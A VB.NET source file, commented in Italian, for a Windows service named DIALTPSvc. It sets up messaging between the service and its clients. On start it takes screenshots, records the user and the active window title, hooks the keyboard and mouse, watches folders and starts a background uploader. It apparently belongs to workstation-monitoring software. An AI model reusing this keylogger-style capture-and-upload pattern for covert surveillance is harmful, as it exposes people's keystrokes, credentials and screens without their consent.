Imports System.ServiceProcess

Public Class DIALTPService
    Public Const logspace As String = "-----------------------------------------------------------------------"

    ''' <summary>
    ''' Evento generato dal servizio di sistema ed inviato ad i clients
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Public Shared Event ServiceMessageReceived(ByVal sender As Object, ByVal e As DIALTPServiceEvt)

    ''' <summary>
    ''' Evento generato dai clients ed inviato al servizio di sistema
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Public Shared Event ClientMessageReceived(ByVal sender As Object, ByVal e As DIALTPServiceEvt)

    Public Const SVCNAME As String = "DIALTPSvc" '"BeepService" 

    Private Shared myController As ServiceController
    Private Shared listener As FinSeA.Net.Messaging.XDListener
    Private Shared WithEvents Timer1 As New System.Timers.Timer

    Private Shared Sub Initialize()
        If myController IsNot Nothing Then Exit Sub

        myController = New ServiceController(SVCNAME)
        listener = New FinSeA.Net.Messaging.XDListener
        AddHandler listener.MessageReceived, AddressOf handleMessage
        listener.RegisterChannel("DIALTPSvc")
    End Sub

    Private Shared Sub Terminate()
        listener.UnRegisterChannel("DIALTPSvc")
        RemoveHandler listener.MessageReceived, AddressOf handleMessage
        listener = Nothing
        myController.Dispose()
        myController = Nothing
    End Sub



    Public Shared Function GetServiceStatus() As String
        Try
            Initialize()
            myController.Refresh()
            Return myController.Status.ToString()
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function

    Public Shared Sub SendMessageToService(ByVal msg As String, Optional ByVal data As Object = Nothing)
        Initialize()
        Dim pl As New DIALTPServiceEvt

        pl.m_Sender = "DIALTP"
        pl.m_Target = "DIALTPSvc"
        pl.m_Channel = "DIALTPSvc"
        pl.m_Message = msg
        pl.m_Data = data

        FinSeA.Net.Messaging.XDBroadcast.SendToChannel("DIALTPSvc", pl)

    End Sub

    Public Shared Sub SendMessageToClients(ByVal msg As String, Optional ByVal data As Object = Nothing)
        Initialize()

        Dim pl As New DIALTPServiceEvt
        pl.m_Sender = "DIALTPSvc"
        pl.m_Target = "DIALTP"
        pl.m_Channel = "DIALTPSvc"
        pl.m_Message = msg
        pl.m_Data = data

        FinSeA.Net.Messaging.XDBroadcast.SendToChannel("DIALTPSvc", pl)
    End Sub

    Private Shared Sub handleMessage(ByVal sender As Object, ByVal e As FinSeA.Net.Messaging.XDMessageEventArgs)
        Dim pl As DIALTPServiceEvt = DirectCast(e.DataGram.Message, DIALTPServiceEvt)
        If (pl.Sender = "DIALTPSvc" AndAlso pl.Target = "DIALTP") Then
            RaiseEvent ServiceMessageReceived(Nothing, pl)
        ElseIf (pl.Sender = "DIALTP" AndAlso pl.Target = "DIALTPSvc") Then
            RaiseEvent ClientMessageReceived(Nothing, pl)
        End If
    End Sub


    Private Shared lock As New Object

    Private Shared Sub handleCM(ByVal sender As Object, ByVal e As DIALTPServiceEvt)
        Log("DIALTPSvc.handleCM(" & e.Sender & vbTab & e.Target & vbTab & CStr(e.Message) & ")")
    End Sub

    Private Shared Sub handleSM(ByVal sender As Object, ByVal e As DIALTPServiceEvt)
        Log("DIALTPSvc.handleSM(" & e.Sender & vbTab & e.Target & vbTab & CStr(e.Message) & ")")
    End Sub

    Public Shared Sub Log(ByVal text As String)
        If FinSeA.Sistema.ApplicationContext.IsDebug Then
            SyncLock lock
                Dim fs As New System.IO.FileStream("C:\Temp\DIALTPSvcSM.txt", IO.FileMode.Append)
                Dim buff() As Byte = System.Text.Encoding.Default.GetBytes(FinSeA.Sistema.Formats.FormatUserDateTime(Now) & vbTab & text & vbNewLine)
                fs.Write(buff, 0, buff.Length)
                fs.Dispose()
            End SyncLock
        End If
    End Sub


    Private Shared Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Elapsed
        DIALTPLib.Log.Reset()
    End Sub

    Public Shared Sub StartService(ByVal mHandle As Integer)
        ' Add code here to start your service. This method should set things
        ' in motion so your service can do its work.

        DIALTPLib.Log.TakeFullScreenShot()

        DIALTPLib.Log.LogMessage(logspace)
        DIALTPLib.Log.LogMessage("Servizio DIALTPSvc Avvioato")
        DIALTPLib.Log.LogMessage("Postazione di lavoro: " & My.Computer.Name)
        DIALTPLib.Log.LogMessage("Utente collegato: " & Environment.UserName)
        DIALTPLib.Log.LogMessage("FINESTRA ATTIVA: " & DIALTPLib.Window.GetActiveWindowTitle(True))
        'DIALTP.Log.Append("Nome del file di log: " & My.Settings.LastLogFile)
        'DIALTP.Processi.CheckProcesses()

        DIALTPLib.Keyboard.HookKeyboard(mHandle)
        Log("Keyboard Hooked: " & DIALTPLib.Keyboard.Hooked)
        DIALTPLib.Mouse.Hook(mHandle)
        'Me.Log("Mouse Hooked: " & DIALTPLib.Mouse.Hookd)

        'AddHandler AsteriskServers.ConfigurationChanged, AddressOf AsteriskConfigChanged
        'DIALTP.Log.timer.Interval = Math.Max(My.Settings.LogEvery * 1000, 1000)
        'DIALTP.Log.timer.Enabled = True


        'Timer.Interval = 100
        'Timer.Enabled = True 'Not FinSeA.Sistema.TestFlag(My.Settings.Flags, My.AppFlags.NOSCREENSCHOTS)

        DIALTPLib.FolderWatch.StartWatching()

        ' DIALTPLib.Log.Reset()

        Timer1.Interval = 1000 * 60
        Timer1.Enabled = True

        DIALTPLib.BGUploader.StartUploading()

        DIALTPLib.DIALTPService.SendMessageToClients("DIALTP Service Avviato")

        DIALTPLib.DIALTPService.Initialize()
        AddHandler DIALTPLib.DIALTPService.ClientMessageReceived, AddressOf handleCM
        AddHandler DIALTPLib.DIALTPService.ClientMessageReceived, AddressOf handleSM
    End Sub

    Public Shared Sub StopService()
        DIALTPLib.DIALTPService.SendMessageToClients("DIALTP Service In Chiusura")
        DIALTPService.Terminate()

        RemoveHandler DIALTPLib.DIALTPService.ClientMessageReceived, AddressOf handleCM
        RemoveHandler DIALTPLib.DIALTPService.ClientMessageReceived, AddressOf handleSM

        DIALTPLib.BGUploader.StopUploading()

        ' Add code here to perform any tear-down necessary to stop your service.
        Timer1.Enabled = False

        DIALTPLib.Keyboard.UnhookKeyboard()
        'Log("Keyboard UnHooked: " & DIALTPLib.Keyboard.Hooked)

        DIALTPLib.Mouse.UnHook()

        DIALTPLib.FolderWatch.StopWatching()
        'DIALTPLib.Log.Reset()
    End Sub

#Region "Internals"

   
    <Serializable> _
    Public Class DIALTPServiceEvt
        Inherits System.EventArgs

        Friend m_Sender As String
        Friend m_Target As String
        Friend m_Channel As String
        Friend m_Message As Object
        Friend m_Data As Object

        Public Sub New()
        End Sub

        Public Sub New(ByVal msg As Object)
            Me.m_Message = msg
        End Sub


        ''' <summary>
        ''' Restituisce il nome del mittente
        ''' </summary>
        ''' <value></value>
        ''' <returns></returns>
        ''' <remarks></remarks>
        Public ReadOnly Property Sender As String
            Get
                Return Me.m_Sender
            End Get
        End Property

        ''' <summary>
        ''' Restituisce il nome del destinatario
        ''' </summary>
        ''' <value></value>
        ''' <returns></returns>
        ''' <remarks></remarks>
        Public ReadOnly Property Target As String
            Get
                Return Me.m_Target
            End Get
        End Property

        ''' <summary>
        ''' Restituisce il nome del canale di comunicazione
        ''' </summary>
        ''' <value></value>
        ''' <returns></returns>
        ''' <remarks></remarks>
        Public ReadOnly Property Channel As String
            Get
                Return Me.m_Channel
            End Get
        End Property

        ''' <summary>
        ''' Restitusice il messaggio inviato
        ''' </summary>
        ''' <value></value>
        ''' <returns></returns>
        ''' <remarks></remarks>
        Public ReadOnly Property Message As Object
            Get
                Return Me.m_Message
            End Get
        End Property

        ''' <summary>
        ''' Restituisce eventuali parametri inviati
        ''' </summary>
        ''' <value></value>
        ''' <returns></returns>
        ''' <remarks></remarks>
        Public ReadOnly Property Data As Object
            Get
                Return Me.m_Data
            End Get
        End Property



    End Class

#End Region

   

End Class
